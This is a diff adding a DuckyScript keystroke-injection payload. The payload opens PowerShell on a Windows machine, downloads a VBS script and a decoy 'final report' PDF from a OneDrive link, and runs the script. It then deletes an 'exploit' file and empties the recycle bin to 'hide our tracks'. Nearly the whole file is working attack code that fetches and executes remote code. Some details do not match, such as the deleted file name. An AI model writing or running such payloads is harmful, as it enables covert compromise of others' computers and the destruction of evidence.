@@ -1,0 +1,29 @@
+REM open powershell
+WINDOWS
+DELAY 100
+STRING powershell
+ENTER
+DELAY 1000
+REM download dummy doc and payload (final report)
+STRING Invoke-WebRequest -Uri "https://1drv.ms/u/s!Au6E5h9rLNXMh8MatnZJpc2X1o07Og?e=IqBiKb" -OutFile "c:\Users\$env:username\Downloads\paperduck_error.vbs"
+ENTER
+DELAY 1000
+STRING Invoke-WebRequest -Uri "https://1drv.ms/u/s!Au6E5h9rLNXMh8MatnZJpc2X1o07Og?e=IqBiKbq" -OutFile "c:\Users\$env:username\Downloads\finalreport_HAmelang.pdf"
+ENTER
+DELAY 1000
+REM go to downloads folder
+STRING cd c:\Users\$env:username\Downloads
+ENTER
+DELAY 1000
+REM activate the error message
+STRING .\paperduck_error.vbs
+ENTER
+DELAY 1000
+REM switch back to powershell window
+ALT TAB
+REM delete exploit file and empty recycle bin to hide our tracks a little
+STRING rm exploit_hidden_exe.pdf
+STRING Clear-RecycleBin
+DELAY 1000
+REM close powershell, leaving dummy doc on screen
+ALT F4
